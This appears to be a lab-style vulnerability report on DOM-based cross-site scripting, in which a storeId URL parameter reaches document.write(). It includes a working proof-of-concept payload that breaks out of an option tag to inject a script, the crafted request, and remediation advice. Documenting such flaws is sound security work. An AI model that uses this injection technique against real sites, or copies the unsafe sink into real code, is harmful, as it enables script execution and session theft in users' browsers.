# DOM-Based Cross-Site Scripting (XSS) via document.write()

## Summary

A DOM-Based Cross-Site Scripting (XSS) vulnerability was identified in the store selection functionality of the application. User-controlled input from the `storeId` URL parameter is inserted into the page using `document.write()` without sanitization, allowing arbitrary JavaScript execution in the victim's browser.

---

## Vulnerability Type

**DOM-Based Cross-Site Scripting (DOM XSS)**

---

## Source

The application reads user-controlled data from the URL using the following code:

```javascript
var store = (new URLSearchParams(window.location.search)).get('storeId');
```

The value of the `storeId` parameter is stored in the `store` variable and later rendered into the page.

---

## Sink

The vulnerable sink is:

```javascript
document.write('<option selected>' + store + '</option>');
```

The application writes untrusted user input directly into the DOM without any sanitization or encoding.

---

## Impact

Successful exploitation allows execution of arbitrary JavaScript in the victim's browser.

Potential impacts include:

* Session theft
* Account compromise
* Phishing attacks
* Execution of unauthorized actions on behalf of the victim
* Modification of page content

---

## Analysis

The application retrieves the value of the `storeId` parameter from the URL and stores it in the `store` variable.

The value is then rendered inside an HTML `<option>` element:

```html
<option selected>USER_INPUT</option>
```

Because no sanitization is applied, an attacker can inject HTML that closes the existing `<option>` element and introduces a new executable context.

By supplying a malicious payload, the browser interprets the injected content as HTML instead of plain text, resulting in JavaScript execution.

---

## Proof of Concept

### Payload

```html
</option><script>alert("1")</script><option>
```

### Request

```text
?productId=18&storeId=</option><script>alert("1")</script><option>
```

### Resulting HTML

```html
<option selected></option>
<script>alert("1")</script>
<option></option>
```

When the page is rendered, the injected `<script>` tag executes and displays an alert box.

---

## Root Cause

User-controlled input from the URL is written directly into the DOM using `document.write()` without proper validation, sanitization, or output encoding.

---

## Remediation

Avoid inserting untrusted user input directly into the DOM.

Recommended mitigations:

* Avoid using `document.write()` with user-controlled data.
* Use safe DOM APIs such as:

  * `textContent`
  * `createTextNode()`
* Apply context-aware output encoding.
* Validate and sanitize user input before rendering it in the page.

---

## Conclusion

A DOM-Based XSS vulnerability exists because attacker-controlled input from the `storeId` parameter is written directly into the page using `document.write()`. By escaping the intended HTML context and injecting a `<script>` tag, arbitrary JavaScript execution can be achieved in the victim's browser.
